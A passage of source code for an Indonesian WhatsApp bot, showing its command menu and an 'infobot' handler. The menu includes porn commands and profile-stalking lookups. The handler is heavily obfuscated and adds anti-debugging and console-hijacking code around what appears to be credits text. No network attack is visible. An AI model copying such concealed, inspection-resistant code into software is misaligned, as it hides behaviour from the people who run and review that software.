     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))

//━━━━━━━━━━━━━━━[ MENU ]━━━━━━━━━━━━━━━━━//

switch (command) {
	case 'menu':
	gambar = fs.readFileSync('./zeroyt7/zero.jpg')
	timestamp = speed();
    latensi = speed() - timestamp	
	menunya = `
🎅 Owner Name : ${ownername}
😈 Bot Name : ${botname}
💞 Owner Number : ${owner}
🐊 Runtime : ${process.uptime()}
🐜 Speed : ${latensi.toFixed(4)} second
✉️ Email : zero.yt701@gmail.com
☕ Browser : Linux
🌍 Lengauge : Javascript`
but = [
          { buttonId: `${prefix}allmenu`, buttonText: { displayText: '☰ ALL MENU' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: '☰ OWNER' }, type: 1 },
          { buttonId: `${prefix}infobot`, buttonText: { displayText: '☰ INFO' }, type: 1 }
        ]
        sendButLocation(from, menunya, faketeks, gambar, but)
break
	case 'allmenu':
	gambar = fs.readFileSync('./zeroyt7/zero.jpg')
                   timestamp = speed();
				latensi = speed() - timestamp	
              menunya = 
`Hi ${pushname}, ${tampilUcapan}✨
Saya ${botname} Yg Siap Membantu Anda Dalam Kinerja Whatsapp Agar Mempermudah Seperti Membuat Sticker , Dll

╭─⬣「 Group Menu 」⬣
│ ♨️ ${prefix}antilink
│ ♨️ ${prefix}welcome
│ ♨️ ${prefix}antivirtex
│ ♨️ ${prefix}group
│ ♨️ ${prefix}linkgrup
│ ♨️ ${prefix}promote
│ ♨️ ${prefix}demote
│ ♨️ ${prefix}add
│ ♨️ ${prefix}kick
│ ♨️ ${prefix}setpp
│ ♨️ ${prefix}setdesc
│ ♨️ ${prefix}setname
│ ♨️ ${prefix}hidetag
└⬣
╭─⬣「 Sticker Menu 」⬣
│ 💡 ${prefix}attp
│ 💡 ${prefix}toimg
│ 💡 ${prefix}sticker
│ 💡 ${prefix}tomp3
│ 💡 ${prefix}tovideo
└⬣
╭─⬣「 Owner Menu 」⬣
│ 📞 ${prefix}owner
│ 📞 ${prefix}sewabot
│ 📞 ${prefix}bc
│ 📞 ${prefix}report
└⬣
╭─⬣「 Sound Menu 」⬣
│ 🎧 ${prefix}sound1
│ 🎧 ${prefix}sound2
│ 🎧 ${prefix}sound3
│ 🎧 ${prefix}sound4
│ 🎧 ${prefix}sound5
│ 🎧 ${prefix}sound6
│ 🎧 ${prefix}sound7
│ 🎧 ${prefix}sound8
│ 🎧 ${prefix}sound9
│ 🎧 ${prefix}sound10
│ 🎧 ${prefix}sound11
│ 🎧 ${prefix}sound12
│ 🎧 ${prefix}sound13
│ 🎧 ${prefix}sound14
│ 🎧 ${prefix}sound15
└⬣
╭─⬣「 Game Menu 」⬣
│ 🎮 ${prefix}truth
│ 🎮 ${prefix}dare
│ 🎮 ${prefix}tebakkalimat
│ 🎮 ${prefix}tebakkata
│ 🎮 ${prefix}tebakgambar
│ 🎮 ${prefix}tebaklirik
│ 🎮 ${prefix}tebaktebakan
│ 🎮 ${prefix}tebakkimia
│ 🎮 ${prefix}tebakjenaka
│ 🎮 ${prefix}suit
└⬣
╭─⬣「 Downloader Menu 」⬣
│ 📤 ${prefix}play
│ 📤 ${prefix}ytsearch
│ 📤 ${prefix}ytmp4
│ 📤 ${prefix}tiktok
│ 📤 ${prefix}tiktokmusic
│ 📤 ${prefix}pinterest
│ 📤 ${prefix}fbdl
│ 📤 ${prefix}igdl
└⬣
╭─⬣「 Asupan Menu 」⬣
│ 🍵 ${prefix}asupan
│ 🍵 ${prefix}asupancecan
│ 🍵 ${prefix}asupanhijaber
│ 🍵 ${prefix}asupansantuy
│ 🍵 ${prefix}asupanukhti
│ 🍵 ${prefix}asupanbocil
│ 🍵 ${prefix}asupanghea
│ 🍵 ${prefix}asupanrika
└⬣
╭─⬣「 Quotes Menu 」⬣
│ 🍂 ${prefix}quotesanime
│ 🍂 ${prefix}quotesanime
│ 🍂 ${prefix}quotesdilan
│ 🍂 ${prefix}quotesimage
│ 🍂 ${prefix}katabijak
│ 🍂 ${prefix}randomnama
└⬣
╭─⬣「 Meme Menu 」⬣
│ 💣 ${prefix}meme
│ 💣 ${prefix}darkjoke
│ 💣 ${prefix}memeindo
└⬣
╭─⬣「 Upsw Menu 」⬣
│ 💫 ${prefix}upswteks
│ 💫 ${prefix}upswsticker
│ 💫 ${prefix}upswaudio
│ 💫 ${prefix}upswvideo
│ 💫 ${prefix}upswimage
└⬣
╭─⬣「 Url Menu 」⬣
│ 💌 ${prefix}tinyurl
│ 💌 ${prefix}bitly
│ 💌 ${prefix}shorturl
│ 💌 ${prefix}cuttly
└⬣
╭─⬣「 Information Menu 」⬣
│ 🔥 ${prefix}kbbi
│ 🔥 ${prefix}jarak
│ 🔥 ${prefix}wikipedia
│ 🔥 ${prefix}translate
│ 🔥 ${prefix}jadwaltv
│ 🔥 ${prefix}infogempa
│ 🔥 ${prefix}cuaca
│ 🔥 ${prefix}covidindo
│ 🔥 ${prefix}covidglobal
└⬣
╭─⬣「 Primbon Menu 」⬣
│ 🎀 ${prefix}artinama
│ 🎀 ${prefix}jodoh
│ 🎀 ${prefix}jadian
│ 🎀 ${prefix}tebakumur
└⬣
╭─⬣「 Stalk Menu 」⬣
│ 🎃 ${prefix}stalkig
│ 🎃 ${prefix}stalktiktok
│ 🎃 ${prefix}stalkgithub
└⬣
╭─⬣「 Anime Menu 」⬣
│ 🗞️ ${prefix}loli
│ 🗞️ ${prefix}neko
│ 🗞️ ${prefix}waifu
│ 🗞️ ${prefix}shota
│ 🗞️ ${prefix}husbu
│ 🗞️ ${prefix}sagiri
│ 🗞️ ${prefix}shinobu
│ 🗞️ ${prefix}megumin
│ 🗞️ ${prefix}wallnime
└⬣
╭─⬣「 Maker Menu 」⬣
│ 🏷️ ${prefix}tahta
│ 🏷️ ${prefix}thunder
│ 🏷️ ${prefix}blackpink
│ 🏷️ ${prefix}glitch
│ 🏷️ ${prefix}marvel
└⬣
╭─⬣「 18+ Menu 」⬣
│ 😈 ${prefix}bokep
│ 😈 ${prefix}dosa1
│ 😈 ${prefix}dosa2
│ 😈 ${prefix}dosa3
│ 😈 ${prefix}dosa4
│ 😈 ${prefix}dosa5
│ 😈 ${prefix}dosa6
│ 😈 ${prefix}dosa7
│ 😈 ${prefix}dosa8
│ 😈 ${prefix}dosa9
│ 😈 ${prefix}dosa10
│ 😈 ${prefix}dosa11
│ 😈 ${prefix}dosa12
│ 😈 ${prefix}dosa13
│ 😈 ${prefix}dosa14
│ 😈 ${prefix}dosa15
└⬣
`
teks =
`Ini Sc Buatan Zero YT7 Silahkan Di Pake Jika Ingin Recode Atau Reupload Tolong Creator Jangan Hpus Tolong Hargai Karya Orang 🙏`
but = [
          { buttonId: `${prefix}infobot`, buttonText: { displayText: '☰ INFO' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: '☰ OWNER' }, type: 1 }
        ]
        sendButLocation(from, menunya, teks, gambar, but)
break
case 'infobot':
var _0x47047b=_0x30f5,_0x1b48d9=_0x30f5,_0x5e2f5f=_0x30f5,_0x386959=_0x30f5,_0x70e9c3=_0x30f5;(function(_0x1faaeb,_0x6485a0){var _0x4d2670=_0x30f5,_0x1abab4=_0x30f5,_0x466f0d=_0x30f5,_0x290e3a=_0x30f5,_0x3ad958=_0x30f5,_0x32b18b=_0x1faaeb();while(!![]){try{var _0x2e2224=parseInt(_0x4d2670(0x2c4))/(0x11*-0x228+0x21f0+0x2b9)*(parseInt(_0x1abab4(0x199))/(-0x1ba5+-0x5*-0x373+-0x534*-0x2))+-parseInt(_0x466f0d(0x245))/(-0x2*-0xee8+0x339*-0x4+-0x10e9)*(parseInt(_0x1abab4(0x201))/(0x142*0xb+0x1d21+-0x1*0x2af3))+parseInt(_0x290e3a(0x185))/(0x1449+0x497+-0x3f*0x65)+parseInt(_0x3ad958(0x280))/(-0xfcc+-0x13b+0x110d)*(parseInt(_0x466f0d(0x250))/(0x181+0x239a*-0x1+-0x16c*-0x18))+parseInt(_0x4d2670(0x2b2))/(0x154d+0x6f7*0x5+0x703*-0x8)+parseInt(_0x4d2670(0x16b))/(0x22ac+0x8*-0x15a+-0x17d3)+-parseInt(_0x466f0d(0x1b3))/(-0x6*0x1a1+-0x2*0xba1+0x2112)*(parseInt(_0x3ad958(0x176))/(-0x1ce8+0xeb+-0xd*-0x228));if(_0x2e2224===_0x6485a0)break;else _0x32b18b['push'](_0x32b18b['shift']());}catch(_0x4fe5a4){_0x32b18b['push'](_0x32b18b['shift']());}}}(_0x1f02,0x11*-0xded6+-0x634f*0x2b+0x422bd*0xb),timestamp=speed(),latensi=speed()-timestamp,teks=_0x47047b(0x1e3)+_0x47047b(0x16e)+_0x5e2f5f(0x2b4)+_0x47047b(0x2ad)+_0x47047b(0x22f)+_0x47047b(0x2cb)+_0x5e2f5f(0x1fc)+_0x386959(0x1b0)+_0x1b48d9(0x290)+_0x386959(0x1fe)+_0x386959(0x299)+_0x47047b(0x213)+':\x20'+ownername+(_0x386959(0x2ad)+_0x70e9c3(0x1d1)+_0x1b48d9(0x1c4)+':\x20')+botname+(_0x1b48d9(0x2ad)+_0x47047b(0x2de)+_0x5e2f5f(0x1a9)+_0x5e2f5f(0x1cb)+_0x386959(0x2de)+_0x1b48d9(0x29b)+_0x47047b(0x228)+_0x70e9c3(0x198)+_0x47047b(0x222)+_0x1b48d9(0x237))+pendaftar[_0x5e2f5f(0x2b1)+'h']+(_0x5e2f5f(0x2ad)+_0x1b48d9(0x2d9)+_0x386959(0x1f5)+'\x20')+runtime(process[_0x47047b(0x2f5)+'e']())+(_0x5e2f5f(0x2ad)+_0x1b48d9(0x289)+_0x47047b(0x262))+latensi[_0x47047b(0x1d6)+'ed'](-0x38*0x67+-0x1408*-0x1+0x284)+(_0x5e2f5f(0x1a1)+_0x5e2f5f(0x2c5)+_0x5e2f5f(0x260)+_0x5e2f5f(0x1ef)+_0x70e9c3(0x194)+_0x47047b(0x18f)+_0x5e2f5f(0x2af)+_0x386959(0x29c)+_0x1b48d9(0x17a)+_0x1b48d9(0x269)+_0x1b48d9(0x177)+_0x1b48d9(0x2dd)+_0x386959(0x220)+_0x386959(0x26c)+_0x1b48d9(0x22a)+_0x386959(0x2cf)+_0x1b48d9(0x265)+_0x47047b(0x2ed)+_0x47047b(0x1bb)+_0x386959(0x2d8)+_0x1b48d9(0x1ce)+_0x386959(0x2e2)+_0x1b48d9(0x2a0)+_0x70e9c3(0x1cf)+_0x5e2f5f(0x1e9)+_0x5e2f5f(0x2b0)+_0x386959(0x23e)+_0x1b48d9(0x2ee)+_0x1b48d9(0x26b)+_0x386959(0x2c0)+_0x47047b(0x28b)+_0x386959(0x23f)+_0x47047b(0x28f)+_0x1b48d9(0x191)+_0x5e2f5f(0x177)+_0x386959(0x1d9)));var _0x18f923={};function _0x1f02(){var _0x2754f1=['kNNYt','FGDFS','s\x20To\x20','\x5c+\x5c+\x20','sCpBn','CIFsQ','1003evKYQI','nd\x0a*┃','ructo','YzFTc','GVlSx','Dbvol','hlhMb','tor\x20B','cuTRb','KIoTw','Dvqwv','h\x20S.W','split','XauOw','uzdwz','ribPk','CJrGz','hlSuU','YvaFX','HwjUC','o\x20Ort','\x20Runt','HfuWq','kQUTq','n()\x20','*\x0a*┃◗','\x20Pref','AZBYt','rQett','zA-Z_','◗\x20Tha','HfGhG','ctor(','rkCci','DYYZs','EqLax','Sscgm','while','NTIFC','n\x20(fu','YssKW','┃◗\x20Th','\x0a*┃◗\x20','init','XVdZV','debu','hLsxY','wanfJ','FPrHn','uptim','wEMZn','zLmEV','rn\x20th','ion\x20*','tseHU','butto','MGAts','wQphM','DmkGL','LVmFk','CYFTI','fEHEg','zsaKM','MluRt','phqJg','Soscf','bQPFD','174159YfNZrE','EXkoR','oMFni','INFO\x20','fVhEr','TPymG','VvIkT','DWoWE','excep','DoslD','|5|3|','11qrOYZK','━━━━━','KefHn','dUFqp','ejs\x0a*','KWKmm','babIy','SARAd','tVyEj','ckhRH','mCgRN','lwSxB','avwgZ','RIHgH','warn','3870020BfzvBU','YoNwD','(((.+','eobPP','kdIfq','mYhvd','*(?:[','LPWhL','mTwTy','nstru','avasc','Ydakv','u*\x0a*┗','YhxbV','VTJHJ','e\x20:\x20J','state','dJJIN','VjgSK','tal\x20P','2620VevlFo','ZjSlY','Mvevy','UDQzL','sLEni','tkMtq','5|4|1','cySgJ','\x20seco','proto','e)\x20{}','ECAKO','type','lhnwH','__pro','0-9a-','ix\x20:\x20','zMoOx','kfhAA','xBLpO','info','uYEMz','DOsvx','Zero\x20','table','FGHyR','10859790TGYzmd','nAflo','VXBsM','EsBOb','QtOmc','ing','|5|4|','GwRLt','ank\x20T','NKSrJ','nText','1|4|0','ZNNVg','oGlpl','mzsvd','Szszs','CiJVS','\x20Bot\x20','wHODr','chain','log','SYaBV','SnYtt','JhOyB','Multi','oPIbw','input','u*\x0a*┃','\x20Zero','IYRAs','\x20Nama','YkYlV','gphBa','2|1|3','\x20(tru','toFix','VDeUg','UwTmf','━━\x20•*','qohih','nxzAi','HNPBU','to__','oivHl','gger','funct','ljoAB','\x20Worl','┏━➤\x20*','sDhoH','hNyBs','XTjEv','DPhZx','tsqRP','\x20YT7\x20','jmOps','vLVrs','IPT','odNEJ','Z_$][','nguag','RKlIB','jjOWq','HFquS','RQLSU','gHboG','ime\x20:','NxRzN','FMYZB','nId','NoEze','hbBqU','strin','ot\x20:\x20','GohEl','┃┃*\x20N','yPPTP','YsJnf','284656RAYJeV','tion','xdglE','odwAt','FEWkE','Idqgu','KlIxA','xWjqa','HntPT','SrHjv','ZjiDN','gDVdk','Objec','error','NgEOP','FhtHZ','owner','pfOMQ','wner\x20','NsfqH','ayTex','nZbpa','sHZOt','zPyWu','GuGnh','ZTRfa','yFati','NuvnI','pYuRk','iQVZE','AOLBq','\x20Than','HxpDO','enggu','hBxdh','TefJO','QNzVW','|2|3|','LCuTr','┃*\x20To','UIrBc','\x20Alla','OSbzN','vvwjt','CmgRI','MtHqU','\x20Crea','yRTHi','CWtSo','1|2|4','nKYEu','KVHUb','CnYIs','izplk','na\x20:\x20','akemG','UBkfi','cxkvn','apply','PEqxF','kDipM','tor)*','ubscr','QSKeM','lXDNB','rVHgL','☰\x20OWN','SyLMC','75HqVbcx','dvwWx','\x22retu','displ','RDYUZ','ReuIT','qSPtw','NnLis','DPeET','OGuYJ','TnBLA','7KooXhZ','dHpcn','tRGuW','call','LLxff','nctio','bind','Ceual','{}.co','QBlPm','AQsgu','ZZkDP','wkfTE','XuudY','HHIvD','ghkBj','┃*\x20La','euxhf','d\x20:\x20','|3|0','$]*)','.T*\x0a*','MzKTm','bYAfi','fzjHE','┃┗━━━','dIWqn','Thank','ks\x20To','aFCjV','VWbna','tyEby','actio','DdfLh','UNanw','vHpoS','iAjTL','retur','YofLu','HAhdZ','count','dJSoL','NwAft','ZCblY','keelQ','EzHmH','hNzrZ','YMRoN','1389924pOUprf','aUdSo','cYtXz','fVLfG','Bymoq','tPIeH','jgPeL','RAKeW','QGiEv','\x20Spee','ljfrj','All\x20S','gLIfr','SzzUL','AWYRo','iberk','YT7\x0a*','EFShD','\x5c(\x20*\x5c','upqRH','jdxbK','rWSBQ','CRngv',')+)+)','WNrug','ama\x20O','a-zA-','ix\x0a*┃','&\x20Nod','ESBTV','fGscu','☰\x20SCR','nk\x20To','IFRbz','toStr','OHiyT','dLbzy','trace','Fvdez','lyXza','ySkWE','SMcWd','rmuWl','test','is\x22)(','\x0a*┃┃*','RntGv','ript\x20','(Crea','lengt','11556608ZCZwrM','rymLB','BOT*\x20','XpjIP','gxfQa','conso','searc','Hello','const','KTxnq','niLKL','FDtvC'];_0x1f02=function(){return _0x2754f1;};return _0x1f02();}_0x18f923[_0x70e9c3(0x248)+_0x5e2f5f(0x215)+'t']=_0x5e2f5f(0x243)+'ER';var _0x45dbc6={};_0x45dbc6[_0x47047b(0x15f)+_0x5e2f5f(0x1f8)]=prefix+_0x47047b(0x211),_0x45dbc6[_0x70e9c3(0x15f)+_0x386959(0x1bd)]=_0x18f923,_0x45dbc6[_0x5e2f5f(0x1a5)]=0x1;var _0x15a504={};_0x15a504[_0x5e2f5f(0x248)+_0x5e2f5f(0x215)+'t']=_0x1b48d9(0x29f)+_0x386959(0x1ec);var _0x3b5eac={};_0x3b5eac[_0x70e9c3(0x15f)+_0x70e9c3(0x1f8)]=prefix+'sc',_0x3b5eac[_0x47047b(0x15f)+_0x5e2f5f(0x1bd)]=_0x15a504,_0x3b5eac[_0x70e9c3(0x1a5)]=0x1,but=[_0x45dbc6,_0x3b5eac],sendButton(from,teks,faketeks,but,mek);function _0x30f5(_0x16246a,_0x505cf9){var _0x584926=_0x1f02();return _0x30f5=function(_0x4dbbbb,_0x184852){_0x4dbbbb=_0x4dbbbb-(0xdc2+0x226b+-0x2ed2*0x1);var _0x52d4c5=_0x584926[_0x4dbbbb];return _0x52d4c5;},_0x30f5(_0x16246a,_0x505cf9);}function hi(){var _0x4d2f80=_0x386959,_0x1728bc=_0x1b48d9,_0x58bea3=_0x386959,_0x4ccfaf=_0x386959,_0x310324=_0x1b48d9,_0x3e7f42={'KTxnq':function(_0x36606d,_0x3e4f21){return _0x36606d===_0x3e4f21;},'YsJnf':_0x4d2f80(0x268),'uzdwz':function(_0x577645,_0x374b7b){return _0x577645!==_0x374b7b;},'LLxff':_0x4d2f80(0x27c),'KefHn':_0x4d2f80(0x261),'SrHjv':function(_0x4cfe39,_0x52627f){return _0x4cfe39(_0x52627f);},'zsaKM':function(_0x12ed3,_0x401b0a){return _0x12ed3+_0x401b0a;},'ckhRH':_0x4ccfaf(0x275)+_0x58bea3(0x2eb)+_0x58bea3(0x255)+_0x310324(0x2dc),'NTIFC':_0x4ccfaf(0x258)+_0x4ccfaf(0x18e)+_0x1728bc(0x2e4)+_0x310324(0x247)+_0x4ccfaf(0x15c)+_0x4d2f80(0x2ac)+'\x20)','ribPk':function(_0x549f17){return _0x549f17();},'CiJVS':_0x4d2f80(0x2e6),'QNzVW':_0x310324(0x2cd),'IYRAs':_0x1728bc(0x27d),'CJrGz':_0x1728bc(0x2b3),'JhOyB':_0x310324(0x1e0)+_0x4d2f80(0x15d)+_0x4ccfaf(0x292)+')','NKSrJ':_0x58bea3(0x2c1)+_0x4d2f80(0x18b)+_0x1728bc(0x29a)+_0x1728bc(0x1ee)+_0x58bea3(0x1a8)+_0x58bea3(0x2e1)+_0x4d2f80(0x264),'cuTRb':function(_0x8b7609,_0xfcb832){return _0x8b7609(_0xfcb832);},'rkCci':_0x58bea3(0x2ef),'jjOWq':function(_0x48d919,_0x238afc){return _0x48d919+_0x238afc;},'GVlSx':_0x1728bc(0x1c6),'QGiEv':_0x4d2f80(0x1cd),'LPWhL':function(_0x4c09b3,_0x4eee06){return _0x4c09b3(_0x4eee06);},'QtOmc':function(_0x4213c6){return _0x4213c6();},'Mvevy':_0x58bea3(0x234),'uYEMz':_0x4ccfaf(0x1a6),'dJSoL':_0x4ccfaf(0x187)+_0x58bea3(0x297)+'+$','ySkWE':function(_0x212d8d,_0xbab1a9){return _0x212d8d===_0xbab1a9;},'dIWqn':_0x4d2f80(0x276),'FhtHZ':_0x4ccfaf(0x249),'rVHgL':_0x58bea3(0x26f),'jgPeL':_0x58bea3(0x1b2),'SzzUL':_0x1728bc(0x241),'tVyEj':_0x58bea3(0x15b),'ZNNVg':_0x58bea3(0x266),'tPIeH':_0x1728bc(0x2e9)+_0x1728bc(0x1d5)+_0x4d2f80(0x1a3),'CmgRI':_0x4d2f80(0x278)+'er','NoEze':function(_0x1711be,_0x147b5b){return _0x1711be===_0x147b5b;},'RQLSU':_0x4ccfaf(0x240),'SnYtt':_0x310324(0x171),'gphBa':function(_0x90a4fb,_0x2d1e5b){return _0x90a4fb(_0x2d1e5b);},'avwgZ':function(_0x387191,_0x20afe6){return _0x387191+_0x20afe6;},'AZBYt':_0x4d2f80(0x1af),'HfuWq':_0x58bea3(0x21d),'Soscf':_0x1728bc(0x2a3),'HFquS':function(_0x5a97ba,_0x23f2e0){return _0x5a97ba!==_0x23f2e0;},'FGDFS':_0x4ccfaf(0x1f7),'gHboG':_0x4ccfaf(0x1e7),'UwTmf':function(_0x211beb,_0x3cc486,_0x2cf92b){return _0x211beb(_0x3cc486,_0x2cf92b);},'yRTHi':function(_0x4693f6,_0x4910a8){return _0x4693f6!==_0x4910a8;},'mzsvd':_0x1728bc(0x2f2),'ZTRfa':_0x4ccfaf(0x235),'AOLBq':_0x1728bc(0x232)+_0x310324(0x263),'HAhdZ':function(_0x2d044c,_0x53bb46){return _0x2d044c<_0x53bb46;},'WNrug':_0x4d2f80(0x19f)+_0x1728bc(0x226)+'0','nxzAi':function(_0x5699ed){return _0x5699ed();},'iQVZE':_0x58bea3(0x1c7),'XVdZV':_0x58bea3(0x184),'nAflo':_0x4ccfaf(0x1ad),'YoNwD':_0x4ccfaf(0x20e),'akemG':_0x310324(0x173)+_0x310324(0x202),'XpjIP':_0x58bea3(0x1b1),'ECAKO':_0x58bea3(0x2a5),'NwAft':function(_0x32bc78,_0x4813fe){return _0x32bc78!==_0x4813fe;},'mYhvd':_0x310324(0x2f4),'KlIxA':_0x58bea3(0x218),'HwjUC':_0x1728bc(0x2ca),'fEHEg':function(_0x253da0){return _0x253da0();},'MtHqU':function(_0x5661b5,_0xfb9f02){return _0x5661b5+_0xfb9f02;},'zMoOx':function(_0x55f430,_0x1e1fa0){return _0x55f430+_0x1e1fa0;},'cySgJ':function(_0x46e752,_0x484a98){return _0x46e752(_0x484a98);},'hNzrZ':function(_0x5a11df,_0x3842de,_0x31e20e){return _0x5a11df(_0x3842de,_0x31e20e);},'SMcWd':_0x58bea3(0x174),'hBxdh':_0x58bea3(0x172),'YhxbV':function(_0x30ecc3,_0x56b113){return _0x30ecc3!==_0x56b113;},'XuudY':_0x4d2f80(0x160),'gxfQa':_0x4d2f80(0x16d),'DmkGL':function(_0x5e9b93,_0x3f3bbd){return _0x5e9b93(_0x3f3bbd);},'rWSBQ':function(_0x3efe81){return _0x3efe81();},'aFCjV':_0x58bea3(0x227),'UIrBc':_0x310324(0x1b6),'izplk':_0x4d2f80(0x17d),'UDQzL':_0x310324(0x1be)+_0x58bea3(0x175)+'2','NxRzN':function(_0x10c4ac,_0x5467e3,_0x249635){return _0x10c4ac(_0x5467e3,_0x249635);},'pfOMQ':function(_0x32a9d5){return _0x32a9d5();},'HfGhG':_0x310324(0x2b9)+_0x4ccfaf(0x1e2)+'d!'},_0x417856=(function(){var _0x13d2c2=_0x1728bc,_0x4831c0=_0x4ccfaf,_0x35ad30=_0x4ccfaf,_0x234c29=_0x1728bc,_0x418a57=_0x4d2f80,_0x5da24a={'YzFTc':function(_0x5dccf4,_0x577242){var _0x2a2a50=_0x30f5;return _0x3e7f42[_0x2a2a50(0x2bb)](_0x5dccf4,_0x577242);},'XTjEv':_0x3e7f42[_0x13d2c2(0x200)],'GwRLt':function(_0x3a2709,_0x30b2f4){var _0x211760=_0x13d2c2;return _0x3e7f42[_0x211760(0x2d2)](_0x3a2709,_0x30b2f4);},'odNEJ':_0x3e7f42[_0x4831c0(0x254)],'oPIbw':_0x3e7f42[_0x4831c0(0x178)],'gDVdk':function(_0x15e08e,_0x2d9d4a){var _0x19da5f=_0x35ad30;return _0x3e7f42[_0x19da5f(0x20a)](_0x15e08e,_0x2d9d4a);},'qSPtw':function(_0x3f2a52,_0x16abc7){var _0x36de1a=_0x35ad30;return _0x3e7f42[_0x36de1a(0x166)](_0x3f2a52,_0x16abc7);},'ljoAB':_0x3e7f42[_0x4831c0(0x17f)],'CIFsQ':_0x3e7f42[_0x418a57(0x2ea)],'yPPTP':function(_0x5e0caf){var _0x5ea804=_0x418a57;return _0x3e7f42[_0x5ea804(0x2d3)](_0x5e0caf);},'upqRH':_0x3e7f42[_0x13d2c2(0x1c3)],'aUdSo':_0x3e7f42[_0x35ad30(0x225)]};if(_0x3e7f42[_0x35ad30(0x2bb)](_0x3e7f42[_0x4831c0(0x1d0)],_0x3e7f42[_0x4831c0(0x2d4)])){var _0x302483=_0x59a160[_0x234c29(0x23b)](_0x2e47f6,arguments);return _0x4695f2=null,_0x302483;}else{var _0x327323=!![];return function(_0x537837,_0x217274){var _0x30ea09=_0x13d2c2,_0x362100=_0x35ad30,_0x47267d=_0x234c29,_0x26f452=_0x234c29,_0x5b0e6d=_0x35ad30,_0x36ff30={'AQsgu':function(_0x154c29,_0x261390){var _0x5e3d6d=_0x30f5;return _0x5da24a[_0x5e3d6d(0x20c)](_0x154c29,_0x261390);},'Fvdez':function(_0x1c1163,_0x1c8ac4){var _0x5d3017=_0x30f5;return _0x5da24a[_0x5d3017(0x24b)](_0x1c1163,_0x1c8ac4);},'VXBsM':_0x5da24a[_0x30ea09(0x1e1)],'qohih':_0x5da24a[_0x362100(0x2c3)],'UNanw':function(_0x2d4f59){var _0x2bc5c7=_0x362100;return _0x5da24a[_0x2bc5c7(0x1ff)](_0x2d4f59);}};if(_0x5da24a[_0x362100(0x2c7)](_0x5da24a[_0x26f452(0x293)],_0x5da24a[_0x30ea09(0x281)])){if(_0x2fb282)return _0x16e811;else rGyUIw[_0x5b0e6d(0x25a)](_0x5b1394,-0x256+-0x1068*0x1+0x12be);}else{var _0x4226fc=_0x327323?function(){var _0x543c1a=_0x362100,_0x3c56fe=_0x47267d,_0x5101a3=_0x26f452,_0x747c77=_0x47267d,_0x884d8c=_0x362100;if(_0x5da24a[_0x543c1a(0x2c7)](_0x5da24a[_0x543c1a(0x1e6)],_0x5da24a[_0x3c56fe(0x1e6)])){if(_0x217274){if(_0x5da24a[_0x3c56fe(0x1ba)](_0x5da24a[_0x747c77(0x1ed)],_0x5da24a[_0x747c77(0x1cc)])){var _0x486ee1=_0x217274[_0x3c56fe(0x23b)](_0x537837,arguments);return _0x217274=null,_0x486ee1;}else{var _0x1fa08e=rGyUIw[_0x884d8c(0x25a)](_0x361743,rGyUIw[_0x3c56fe(0x2a6)](rGyUIw[_0x884d8c(0x2a6)](rGyUIw[_0x543c1a(0x1b5)],rGyUIw[_0x5101a3(0x1da)]),');'));_0x37ad42=rGyUIw[_0x884d8c(0x272)](_0x1fa08e);}}}else return _0x455f24;}:function(){};return _0x327323=![],_0x4226fc;}};}}()),_0x55c8cb=_0x3e7f42[_0x58bea3(0x27e)](_0x417856,this,function(){var _0x55b73e=_0x310324,_0xe68a6e=_0x4ccfaf,_0x4856ab=_0x1728bc,_0xbf8f9a=_0x4ccfaf,_0x42f1c7=_0x310324,_0x4592db={'mTwTy':_0x3e7f42[_0x55b73e(0x1ca)],'XauOw':_0x3e7f42[_0xe68a6e(0x1bc)],'hlSuU':function(_0x367dc1,_0x21dabc){var _0x50939e=_0x55b73e;return _0x3e7f42[_0x50939e(0x2cc)](_0x367dc1,_0x21dabc);},'wkfTE':_0x3e7f42[_0xe68a6e(0x2e5)],'cYtXz':function(_0x9c9d9f,_0x38bf13){var _0x4c1eca=_0x55b73e;return _0x3e7f42[_0x4c1eca(0x1f1)](_0x9c9d9f,_0x38bf13);},'lwSxB':_0x3e7f42[_0x4856ab(0x2c8)],'wQphM':_0x3e7f42[_0x55b73e(0x288)],'NgEOP':function(_0x256ab7,_0x3f5ae9){var _0x533947=_0x4856ab;return _0x3e7f42[_0x533947(0x18c)](_0x256ab7,_0x3f5ae9);},'HNPBU':function(_0x27cf81){var _0x34ffa2=_0xe68a6e;return _0x3e7f42[_0x34ffa2(0x1b7)](_0x27cf81);}};if(_0x3e7f42[_0x4856ab(0x2d2)](_0x3e7f42[_0xbf8f9a(0x19b)],_0x3e7f42[_0x55b73e(0x1ae)]))return _0x55c8cb[_0x4856ab(0x2a2)+_0x42f1c7(0x1b8)]()[_0x55b73e(0x2b8)+'h'](_0x3e7f42[_0x42f1c7(0x279)])[_0xbf8f9a(0x2a2)+_0x4856ab(0x1b8)]()[_0x42f1c7(0x2ba)+_0xe68a6e(0x2c6)+'r'](_0x55c8cb)[_0xe68a6e(0x2b8)+'h'](_0x3e7f42[_0x55b73e(0x279)]);else{var _0x28a2ec=new _0x185751(SUqALz[_0xe68a6e(0x18d)]),_0x299d21=new _0x42f9a8(SUqALz[_0xe68a6e(0x2d1)],'i'),_0x2eec93=SUqALz[_0xbf8f9a(0x2d5)](_0x1c5d47,SUqALz[_0xbf8f9a(0x25c)]);!_0x28a2ec[_0xbf8f9a(0x2ab)](SUqALz[_0xbf8f9a(0x282)](_0x2eec93,SUqALz[_0x55b73e(0x181)]))||!_0x299d21[_0x4856ab(0x2ab)](SUqALz[_0xe68a6e(0x282)](_0x2eec93,SUqALz[_0x55b73e(0x161)]))?SUqALz[_0x4856ab(0x20f)](_0x2eec93,'0'):SUqALz[_0xe68a6e(0x1dc)](_0x2465c9);}});_0x3e7f42[_0x4ccfaf(0x295)](_0x55c8cb);var _0x53c8e2=(function(){var _0x2046ce=_0x4ccfaf,_0x23b59f=_0x58bea3,_0x44ca77=_0x4ccfaf,_0x1e7532=_0x310324;if(_0x3e7f42[_0x2046ce(0x2d2)](_0x3e7f42[_0x23b59f(0x17e)],_0x3e7f42[_0x23b59f(0x1bf)])){var _0x1a25cb=!![];return function(_0xb581e2,_0x20fdb1){var 